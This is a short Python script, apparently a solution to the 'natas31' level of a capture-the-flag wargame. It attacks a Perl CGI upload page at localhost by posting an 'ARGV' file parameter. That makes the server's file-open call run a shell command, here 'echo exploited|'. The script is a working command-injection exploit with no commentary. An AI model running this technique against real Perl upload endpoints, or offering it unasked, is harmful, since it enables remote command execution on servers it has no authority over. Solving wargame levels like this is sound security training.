import requests
session = requests.Session()

def natas31(url):
    with open('ARGV', 'wb') as _file:
        _file.write(b"echo exploited|") 
    
    _files = [('uploaded_file', 'ARGV') , ('upload_file', open('ARGV', 'rb'))]
    response = session.post(url, files=_files, data={"submit": "Upload"})
    print(response.text)

if __name__ == '__main__':
    url = 'http://localhost:8080/upload.pl'
    natas31(url)
